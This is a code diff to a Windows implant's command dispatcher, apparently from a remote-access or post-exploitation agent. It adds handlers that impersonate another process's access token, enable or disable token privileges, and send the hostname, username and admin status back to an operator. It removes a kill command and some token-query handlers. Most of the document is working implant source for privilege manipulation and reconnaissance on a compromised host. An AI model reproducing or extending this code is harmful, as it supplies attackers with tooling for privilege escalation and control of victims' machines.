@@ -4,12 +4,14 @@
 
 /* Maps each generated command identifier to its synchronous command handler. */
 CONST COMMAND_MAP G_CommandTable[] = {
-	{ CMD_KILLIMPLANT, CmdKillImplant },
-	{ CMD_CURRENT_TOKEN, CmdCurrentToken },
-	{ CMD_PROCESS_TOKEN, CmdProcessToken },
-	{ CMD_TOKEN_PRIVILEGES, CmdTokenPrivileges },
+	{ CMD_INSPECT_TOKEN, CmdInspectToken },
 	{ CMD_IMPERSONATE_TOKEN, CmdImpersonateToken },
-	{ CMD_ENABLE_PRIVILEGE, CmdEnablePrivilege }
+	{ CMD_ENABLE_PRIVILEGE, CmdEnablePrivilege },
+	{ CMD_DISABLE_PRIVILEGE, CmdDisablePrivilege },
+	{ CMD_HOSTNAME, CmdHostname },
+	{ CMD_WHOAMI, CmdWhoami}
+
+
 };
 
 /**
@@ -78,24 +80,7 @@ static DWORD ConvertUtf8ToWideString(
 	return NO_ERROR;
 }
 
-DWORD CmdKillImplant(
-	DWORD dataLen,
-	CONST PBYTE data,
-	PBYTE* responseData,
-	DWORD* responseLen
-)
-{
-	UNREFERENCED_PARAMETER(dataLen);
-	UNREFERENCED_PARAMETER(data);
-
-	*responseData = NULL;
-	*responseLen = 0;
-	RequestImplantTermination();
-
-	return NO_ERROR;
-}
-
-DWORD CmdCurrentToken(
+DWORD CmdInspectToken(
 	DWORD dataLen,
 	CONST PBYTE data,
 	PBYTE* responseData,
@@ -108,42 +93,6 @@ DWORD CmdCurrentToken(
 	return BuildCurrentTokenSummaryResponse(responseData, responseLen);
 }
 
-DWORD CmdProcessToken(
-	DWORD dataLen,
-	CONST PBYTE data,
-	PBYTE* responseData,
-	DWORD* responseLen
-)
-{
-	DWORD processId = 0;
-
-	if (dataLen < sizeof(DWORD) || data == NULL)
-	{
-		return ERROR_INVALID_REQUEST;
-	}
-
-	processId = *(DWORD*)data;
-	return BuildProcessTokenSummaryResponse(processId, responseData, responseLen);
-}
-
-DWORD CmdTokenPrivileges(
-	DWORD dataLen,
-	CONST PBYTE data,
-	PBYTE* responseData,
-	DWORD* responseLen
-)
-{
-	DWORD processId = 0;
-
-	if (dataLen < sizeof(DWORD) || data == NULL)
-	{
-		return ERROR_INVALID_REQUEST;
-	}
-
-	processId = *(DWORD*)data;
-	return BuildTokenPrivilegesResponse(processId, responseData, responseLen);
-}
-
 DWORD CmdImpersonateToken(
 	DWORD dataLen,
 	CONST PBYTE data,
@@ -152,9 +101,7 @@ DWORD CmdImpersonateToken(
 )
 {
 	DWORD processId = 0;
-
-	UNREFERENCED_PARAMETER(responseData);
-	UNREFERENCED_PARAMETER(responseLen);
+	DWORD status = NO_ERROR;
 
 	if (dataLen < sizeof(DWORD) || data == NULL)
 	{
@@ -162,7 +109,19 @@ DWORD CmdImpersonateToken(
 	}
 
 	processId = *(DWORD*)data;
-	return ImpersonateProcessToken(processId);
+
+	if (processId == 0 || processId % 4 != 0)
+		return ERROR_INVALID_PID;
+
+	//try to impersonate the token of given pid
+	status = ImpersonateProcessToken(processId);
+
+	//success: build the success data buffer
+	if (status == NO_ERROR) {
+		status = BuildTokenImpersonationResponseFromToken(processId, responseData, responseLen);
+	}
+
+	return status;
 }
 
 DWORD CmdEnablePrivilege(
@@ -175,8 +134,65 @@ DWORD CmdEnablePrivilege(
 	DWORD status = NO_ERROR;
 	PWSTR privilegeName = NULL;
 
-	UNREFERENCED_PARAMETER(responseData);
-	UNREFERENCED_PARAMETER(responseLen);
+	status = ConvertUtf8ToWideString(dataLen, data, &privilegeName);
+	if (status != NO_ERROR)
+	{
+		return status;
+	}
+
+	//check if privilege is already enabled
+	if (IsPrivilegeEnabled(privilegeName))
+	{
+		status = BuildTokenEnablePrivilegeResponseFromToken(privilegeName,
+			PRIV_ENABLE_SUCCESS,
+			PRIV_ENABLED_PREVIOUSLY,
+			responseData,
+			responseLen);
+	}
+	else
+	{
+		//try to enable the privilege of current token
+		status = EnableCurrentTokenPrivilege(privilegeName);
+
+		//check if privilege name is valid
+		if (status == ERROR_INVALID_PRIVILEGE)
+		{
+			goto cleanup;
+		}
+		//success: build the success data buffer
+		if (status == NO_ERROR) {
+			status = BuildTokenEnablePrivilegeResponseFromToken(privilegeName,
+				PRIV_ENABLE_SUCCESS,
+				PRIV_DISABLED_PREVIOUSLY,
+				responseData,
+				responseLen);
+		}
+		//failure: build the failure data buffer with the error code
+		else
+		{
+			status = BuildTokenEnablePrivilegeResponseFromToken(privilegeName,
+				status,
+				PRIV_DISABLED_PREVIOUSLY,
+				responseData,
+				responseLen);
+		}
+
+	}
+cleanup:
+	ImplantHeapFree(privilegeName);
+	return status;
+}
+
+DWORD CmdDisablePrivilege(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	DWORD status = NO_ERROR;
+	PWSTR privilegeName = NULL;
+	DWORD prevStatus = PRIV_DISABLED_PREVIOUSLY;
 
 	status = ConvertUtf8ToWideString(dataLen, data, &privilegeName);
 	if (status != NO_ERROR)
@@ -184,8 +200,136 @@ DWORD CmdEnablePrivilege(
 		return status;
 	}
 
-	status = EnableCurrentTokenPrivilege(privilegeName);
-	ImplantHeapFree(privilegeName);
+	// check if the privilege is currently enabled, and save that state
+	if (IsPrivilegeEnabled(privilegeName))
+	{
+		prevStatus = PRIV_ENABLED_PREVIOUSLY;
+	}
+
+	// try to disable the privilege of current token 
+	status = DisableCurrentTokenPrivilege(privilegeName);
+
+	// reuse enable priv builder response function
+	if (status == NO_ERROR) {
+		status = BuildTokenEnablePrivilegeResponseFromToken(
+			privilegeName,
+			PRIV_DISABLE_SUCCESS,
+			prevStatus,
+			responseData,
+			responseLen);
+	}
+	else
+	{
+		status = BuildTokenEnablePrivilegeResponseFromToken(
+			privilegeName,
+			status,             
+			prevStatus,
+			responseData,
+			responseLen);
+	}
+
+cleanup:
+	if (privilegeName != NULL)
+	{
+		ImplantHeapFree(privilegeName);
+	}
+	return status;
+}
+
+
+DWORD CmdHostname(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	UNREFERENCED_PARAMETER(dataLen);
+	UNREFERENCED_PARAMETER(data);
+
+	DWORD status = NO_ERROR;
+
+	// get the struct
+	AllSI_t sysInfo = GetAllSystemInformation();
+
+	if (!sysInfo.computerName) {
+		status = ERROR_MEMORY_ALLOCATION_FAILED;
+		goto cleanup;
+	}
+
+	// calculate ONLY the size of the computer name (including null terminator)
+	DWORD compBytes = (DWORD)(wcslen(sysInfo.computerName) + 1) * sizeof(WCHAR);
+
+	// allocate response buffer
+	PBYTE responseBuffer = (PBYTE)ImplantHeapAlloc(compBytes);
+	if (responseBuffer == NULL) {
+		status = ERROR_MEMORY_ALLOCATION_FAILED;
+		goto cleanup;
+	}
+
+	// copy ONLY the computer name into the buffer
+	memcpy(responseBuffer, sysInfo.computerName, compBytes);
+
+	*responseData = responseBuffer;
+	*responseLen = compBytes;
+
+cleanup:
+	HANDLE hHeap = GetProcessHeap();
+	if (sysInfo.computerName) ImplantHeapFree(sysInfo.computerName);
+	if (sysInfo.userName) ImplantHeapFree(sysInfo.userName);
+	if (sysInfo.architecture) ImplantHeapFree(sysInfo.architecture);
+
+	return status;
+}
+
+DWORD CmdWhoami(
+	DWORD dataLen,
+	CONST PBYTE data,
+	PBYTE* responseData,
+	DWORD* responseLen
+)
+{
+	UNREFERENCED_PARAMETER(dataLen);
+	UNREFERENCED_PARAMETER(data);
+
+	DWORD status = NO_ERROR;
+
+	AllSI_t sysInfo = GetAllSystemInformation();
+
+	if (!sysInfo.userName) {
+		status = ERROR_MEMORY_ALLOCATION_FAILED;
+		goto cleanup;
+	}
+
+	// calculate string size
+	DWORD userBytes = (DWORD)(wcslen(sysInfo.userName) + 1) * sizeof(WCHAR);
+
+	// buffer size: 4 bytes for the admin flag + the string length
+	DWORD totalLength = sizeof(DWORD) + userBytes;
+
+	PBYTE responseBuffer = (PBYTE)ImplantHeapAlloc(totalLength);
+	if (responseBuffer == NULL) {
+		status = ERROR_MEMORY_ALLOCATION_FAILED;
+		goto cleanup;
+	}
+
+	// pack the Admin flag, then the username string
+	PBYTE offset = responseBuffer;
+
+	*((DWORD*)offset) = (DWORD)sysInfo.admin;
+	offset += sizeof(DWORD);
+
+	memcpy(offset, sysInfo.userName, userBytes);
+
+	*responseData = responseBuffer;
+	*responseLen = totalLength;
+
+cleanup:
+	HANDLE hHeap = GetProcessHeap();
+	if (sysInfo.computerName) ImplantHeapFree(sysInfo.computerName);
+	if (sysInfo.userName) ImplantHeapFree(sysInfo.userName);
+	if (sysInfo.architecture) ImplantHeapFree(sysInfo.architecture);
+
 	return status;
 }
 
